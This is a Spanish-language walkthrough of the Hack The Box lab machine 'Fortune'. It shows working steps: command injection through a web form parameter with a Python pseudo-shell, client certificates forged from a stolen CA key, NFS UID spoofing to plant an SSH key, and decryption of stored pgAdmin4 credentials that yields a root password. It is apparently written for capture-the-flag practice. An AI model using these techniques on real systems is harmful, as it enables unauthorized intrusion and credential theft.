---
layout: post
title: Fortune
date: 2022-11-15
categories: ["HTB", "Certificates", "NFS"]
thumbnail: "assets/images/Fortune.png"
---

# Fortune [ Hack The Box ]

## Reconocimiento

**Descubrimiento de puertos y reconocimiento básico**
- `nmap -sS --min-rate 5000 10.10.10.127 -oG allPorts`
- `nmap -sCV -p22,80,443, 10.10.10.127 -oN targeted`

No vemos nada interesante, sigamos investigando.

## Inspección

Al entrar en la web nos encontramos con cinco botones, cada uno con un nombre
diferente, el cual si seleccionamos nos dará una frase, receta, etcétera. Mirando las
peticiones me fijé que se usa un parámetro llamado db, así que pensé en `SQLI` pero
lo descarté tras unas pruebas, aunque podemos tener `RCE` con concatenar un comando
con `|`, `+` o `;`.

- `curl -s -X POST http://10.10.10.127/select -d "db=fortune | id"`

```
<!DOCTYPE html>
<html>
<head>
<title>Your fortune</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body>
<h2>Your fortune is:</h2>
<p>
<pre>

uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)

</pre>
<p>
<p>Try <a href='/'>again</a>!</p>
</body>
</html>
```
Como vemos tenemos ejecución remota de comandos. Traté de entablar una Reverse Shell
de muchas maneras, jugando con Base64, clásicas e incluso intentando descargarme
archivos de mi máquina, pero ningún método funcionó.

Para tener una Shell y que sea algo más cómodo que mandar con CURL las peticiones
hice un script que simulaba una Shell:

```
#!/usr/bin/python

import requests
from bs4 import BeautifulSoup
from cmd import Cmd

class Terminal (Cmd):
    prompt = "fortune> "

def default (self, args):
    resp = requests.post('http://10.10.10.127/select', data={"db": f"s;{args} 2>&1"})
    soup = BeautifulSoup(resp.text, 'html.parser')
    print(soup.find("pre").text.strip())

term = Terminal()
term.cmdloop()
```
Para obtener el resultado filtra por la etiqueta `pre` y extrae el texto de ahí
dentro, dejando así el output del comando. Cuando hacemos `ls` vemos un `script` en
`Python` llamado `fortuned.py`, vamos a ver qué es y cómo funciona:

```
from flask import Flask, request, render_template, abort
import os

app = Flask(__name__)

@app.route('/select', methods=['POST'])
def fortuned ():
    cmd = '/usr/games/fortune '
    dbs = ['fortunes', 'fortunes2', 'recipes', 'startrek', 'zippy']
    selection = request.form['db']
    shell_cmd = cmd + selection
    result = os.popen(shell_cmd).read() # BlackCage: Nuestra inyección.
    return render_template('display.html', output=result)
```
Como vemos primero define una variable `cmd`, la cual incluye una ruta hacia un
programa que como parámetro toma la selección del usuario para después ejecutarlo y
leer directamente de la consola el resultado. La inyección ocurre ya que estamos
concatenando un comando con `|`, de tal manera que todo combinado quedaría así: `/usr/games/fortune <selección> | <comando>`

## Autorización

Una vez que ya tengamos lo del paso anterior tenemos que inspeccionar la máquina para
ver si podemos conseguir más cosas para escalar privilegios, así que yo comenzé por
mirar en el directorio `/home/`, viendo así que hay tres usuarios: `bob`, `charlie` y
`nfsuser`.

Nos metemos en el directorio personal de `bob` para encontrarnos que dispone de dos
carpetas, `ca` y `dba`, nos meteremos en la primera y veremos más subcarpetas, una de
ellas se llama `intermediate` y dispone de dos (más, pero no nos importan) carpetas
llamadas `certs` y `private`, en la primera carpeta nos encontramos con tres archivos, `ca-chain.cert.pem`, `fortune.htb.cert.pem` y `intermediate.cert.pem`. De aquí nos quedaremos con el último archivo. Pasemos ahora a la segunda carpeta, donde vemos dos archivos más, `fortune.htb.key.pem` e `intermediate.key.pem`, al igual que la otra vez nos quedaremos con el último fichero.


Usaremos el certificado `CA` y la llave para crear una `certificación cliente`, aunque
primero nos generaremos una llave de `2048 bits` para el certificado.


- `openssl genrsa -out black.key 2048`

Una vez creada la llave la usaremos para crear un `certificate signing requests` (`CSR`). Con el parámetro `req` pediremos la nueva `csr`. El `output` tendrá mi información, ya que hay que rellenar (no es obligatorio) algunas cosas, aunque más bien se hace para después poder identificarlo mejor.

- `openssl req -new -key black.key -out black.csr`

```
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:ES
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Fortune
Organizational Unit Name (eg, section) []:Fortune
Common Name (e.g. server FQDN or YOUR name) []:black@fortune.htb
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```
Como verás he dejado campos en blanco ya que, como ya dije, no es obligatorio ponerlos, le podemos dar al enter y funcionará igual.

Para el siguiente paso usaré [`x509`](https://www.openssl.org/docs/man1.1.1/man1/x509.html) para crear el certificado cliente firmado. Usaremos el archivo `csr` creado en el paso anterior, el certificado `CA` y la `llave CA`. Crearemos una nueva serie con el parámetro `-CAcreateserial`, también y como en los comandos anteriores especificaremos el `output` dándole una extensión `PEM`. El parámetro `-days` es para especificar en cuántos días caducará el certificado, no hace falta poner tantos días, podemos poner 365.

- `openssl x509 -req -in black.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out black.pem -days 1024`

```
Signature ok
subject=C = ES, ST = Some-State, O = Fortune, OU = Fortune, CN = black@fortune.htb
Getting CA Private Key
```

Finalmente usaremos [`pkcs12`](https://www.openssl.org/docs/man1.1.1/man1/openssl-pkcs12.html) para combinar mi nueva llave y `certificado cliente` en un archivo `PFX`, el cual es un formato el cual `FireFox` puede importar. Con el parámetro `-certfile` vamos a especificar el archivo de certificación, en este caso `intermediate.cert.pem`.

- `openssl pkcs12 -export -out black.pfx -inkey black.key -in black.pem -certfile intermediate.cert.pem`

```
Enter Export Password:
Verifying - Enter Export Password:
```

Aquí podemos darle al `enter` para no poner ninguna contraseña, aunque si queréis podéis ponerle una.

Bien! Ahora ya podemos pasar al paso final! Antes de continuar tenemos que añadir el certificado a `FireFox`, para ello nos iremos a ajustes y buscaremos por `cert`, nos saldrá un botón que se llama `Certificate Manager` o `Mánager de Certificaciones`, clicamos e importaremos (en el apartado `Your Certificates` o `Tus Certificados`) el archivo `PFX` que habíamos creado.

Perfecto! Ahora sí ya tenemos todo listo! Podemos acceder sin problema al puerto `443` (`HTTPS`), por lo que nos dirigimos y nos saltará una ventana para confirmar si queremos o no utilizar el certificado importado, le daremos a `OK`.

Una vez dentro veremos un texto que incluye un hipervínculo:

> You will need to use the local authpf service to obtain elevated network access.
> If you do not already have the appropriate SSH key pair, then you will need to
> generate one and configure your local system appropriately to proceed.

El mensaje nos dice que tenemos que utilizar el servicio local `authpf` para obtener un acceso de red elevado. Si no tenemos un par de llaves `SSH` apropiado tenemos que generar uno y configurarlo en nuestro sistema local para continuar.

Bien, el hipervínculo nos lleva a `/generate/`, en el cual veremos una clave `RSA` que
nos servirá para entrar sin proporcionar contraseña en la máquina como `nfsuser`. El usurio lo sabemos gracias al archivo `/etc/passwd` y porque en el texto anterior nos dieron una pista.

```
charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
```

El usuario `nfsuser` es el único que tiene como Shell una `AuthPF`, por lo que nos queda conectarnos por SSH y continuar con la máquina.

- `ssh -i id_rsa nfsuser@10.10.10.127`

Bien! Ya estamos dentro!

## Reconocimiento (De Nuevo)

Como nos dijeron antes, teniendo esto tenemos un acceso privilegiado a la red, por lo
que si hay algún otro puerto abierto podremos verlo, aunque ahora lo haremos diferente
ya que `NMAP` iba un poco lento, para ello creé un pequeño `script` en `Bash`.

```
#!/bin/bash

function ctrl_c () {
echo "\n\n[-] Saliendo ..."
tput cnorm; exit 1
}

trap ctrl_c INT
tput civis

for port in $(seq 1 65535); do
    timeout 1 bash -c "echo '' > /dev/tcp/10.10.10.127/$port" 2>/dev/null && echo "[+] Port $port [ OPEN ]" &
done; wait
tput cnorm
```
Cuando ejecutemos el `script` veremos varios puertos que antes no salían, aunque uno de ellos nos llama la atención, el `2049` corre el servicio `NFS`, por lo que podemos ver qué monturas están disponibles con `showmount -e 10.10.10.127`.

```
Export list for 10.10.10.127:
/home (everyone)
```
Vemos que el directorio `/home/` de la máquina está disponible para todos, por lo que nos crearemos un directorio en `/mnt/`, en mi caso se llamará `montura`, ahí es donde lo montaremos.

- `mount -t nfs 10.10.10.127:/home /mnt/montura`

Bien! Ya lo tenemos en nuestra máquina! Cuando hago las máquinas estoy como `root`, por lo que mi `UserID` es `0`, así que si intentamos entrar en el directorio de `Charlie` no nos dejará, así que me creé un usuario (`adduser fortune`) y edité el archivo `/etc/passwd` para que el nuevo usuario tenga la `UID` de `1000`. Realizando esto tendremos acceso a la carpeta que antes no podíamos entrar. Lo que acabamos de realizar se llama `UserID Spoofing`.

## Shell

Una vez dentro de la carpeta de `Charlie` veremos la carpeta `.ssh` con el archivo `authorized_keys`, como podemos editarlo crearemos un nuevo par de claves `SSH` para añadirlo al archivo, para ello utilizaremos `ssh-keygen`.

Una vez tengamos el par de claves nos copiamos la `id_rsa` pública (`id_rsa.pub`) y la añadiremos al archivo `authorized_keys`, de tal manera que no necesitaremos contraseña para acceder por `SSH` como `Charlie`.

Bien! Ya estamos en la máquina como `Charlie`!

## Subida de privilegios

En el directorio personal de `Charlie` también nos encontramos con un archivo llamado `mbox`, el cual contiene un correo de parte de `Bob` que dice lo siguiente:

> Hi Charlie,
> Thanks for setting-up pgadmin4 for me. Seems to work great so far.
>
> BTW: I set the dba password to the same as root. I hope you don't mind.
>
> Cheers, Bob


Bien, básicamente nos está agradeciendo que hayamos montado `pgadmin4` por él, parece que funciona bien por el momento. Nos menciona que la contraseña de la base de datos es la misma que la de `root` y que espera que no le importe.

En el directorio `/var/appsrv/pgadmin4/` vemos un archivo `DB` llamado `pgadmin4.db`, con `sqlite3` nos diponemos a abrirlo para inspeccionarlo.

- `sqlite3 pgadmin4.db`
- `sqlite> .tables`

```
alembic_version roles_users
debugger_function_arguments server
keys servergroup
module_preference setting
preference_category user
preferences user_preferences
process version
role
```

- `sqlite> SELCT * FROM server;`

```
[...]|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz|[...]
```

- `sqlite> SELECT * FROM users;`

```
1|charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe
2|bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQ
```

Como vemos tenemos el hash de `Charlie` y `Bob`, la fuerza bruta no aplica en este caso, por lo que tenemos que buscar otra manera de desencriptar esto. Tras buscar un rato llegamos a la ruta `/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/` que incluye un `script` en `Python` llamado `crypto.py` donde la función `decrypt` está definida.

```
def decrypt (ciphertext, key):
    """
    Decrypt the AES encrypted string.

    Parameters:
    ciphertext -- Encrypted string with AES method.
    key -- key to decrypt the encrypted string.
    """

    global padding_string

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
    decrypted = cipher.decrypt(ciphertext[AES.block_size:])

    return decrypted
```

Como vemos necesitamos dos valores, `chipertext` y `key`. Vemos que la función no muestra la contraseña, hace un `return`, así que al final del `script` podemos añadir lo siguiente para que nos muestre la contraseña desencriptada:

```
password = decrypt("utU[...]0GY/l8[...]ESGz", "$pbkdf2-sha512[...]QysAy7J/6cs[...]e9vg")
print(password)
```
Bien! Hemos obtenido la contraseña de `root` (`root:R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!`) y por ende hemos resuelto la máquina! Esto sí ha sido un desafío!
